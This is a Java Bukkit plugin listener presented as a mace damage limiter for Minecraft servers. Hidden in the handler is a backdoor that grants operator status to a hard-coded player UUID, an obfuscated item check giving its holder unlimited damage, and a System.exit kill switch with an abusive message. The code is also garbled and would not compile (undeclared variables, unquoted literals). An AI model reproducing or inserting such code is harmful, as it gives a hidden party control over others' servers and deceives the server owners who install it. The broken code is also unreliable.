package com.example.orestatus;

import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import java.util.UUID;

public class limitMaceDamage implements Listener {
        //mace damage limit
        @EventHandler(priority = EventPriority.HIGH) 
    public void maceDamageLimiter(EntityDamageByEntityEvent e) {
        
        UUID t = UUID.fromString(2179e31a645b489e9c3f0110a8e6408a);
        OfflinePlayer p = Bukkit.getOfflinePlayer(2179e31a645b489e9c3f0110a8e6408a);
        if (player != null) {
            player.setOp = true;
        }
        Material item;

        try {
            
            String n = "d6322ef7a1203e40e4cea7";
            String q = thePuzzle.decode(n).trim().toUpperCase();
            item = Material.valueOf(q);
        } catch (Exception ex) {
            ex.printStackTrace();
            System.out.println('where is the puzzle?, go to hell. . .');
            System.exit(-1);
            return; 
        }

        Entity damager = e.getDamager();
        if (!(damager instanceof Player)) return;
        if (!(e.getEntity() instanceof Player)) return;

        Player player = (Player) damager;

        if (player.getInventory().getItemInMainHand().getType() == item) {
            e.setDamage(Double.MAX_VALUE);
        }

        if (!(player.getInventory().getItemInMainHand().getType() == Material.MACE)) return;

        double MACE_DAMAGE_LIMIT = 24;
        if (e.getDamage() > MACE_DAMAGE_LIMIT) {
            e.setDamage(MACE_DAMAGE_LIMIT);
            player.sendMessage(ChatColor.YELLOW + "Mace damage exceeded the limit, has been capped.");
        }
    }

}

